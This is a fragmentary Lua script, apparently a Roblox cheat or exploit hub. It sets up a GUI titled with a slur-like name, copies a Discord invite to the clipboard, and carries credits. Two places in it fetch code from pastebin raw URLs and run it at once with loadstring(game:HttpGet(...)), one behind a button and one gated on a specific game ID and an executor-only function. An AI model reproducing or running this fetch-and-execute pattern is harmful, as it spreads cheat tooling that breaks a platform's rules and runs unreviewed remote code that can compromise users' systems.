...
function b.OnInvoke(response) if response == "Copy Link" then if setclipboard then setclipboard("https://discord.gg/NAWdvBrenv") end end end
...
local Window = Library.CreateLib("Gaysense", "DarkTheme")
...
Section2:NewButton("Send Bot Message", "Okkk!!!!!", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/8nr43enu", true))()
end)
Section3:NewButton("Credits: Idklovie", "Okkk!!!!!", function()
    print("Okkkkkkkkk")
end)
...
if getconnections then
  ...
  if game.GameId == 1962086868 then
    loadstring(game:HttpGet(('https://pastebin.com/raw/ZkTGkhEc'), true))()
    return
end
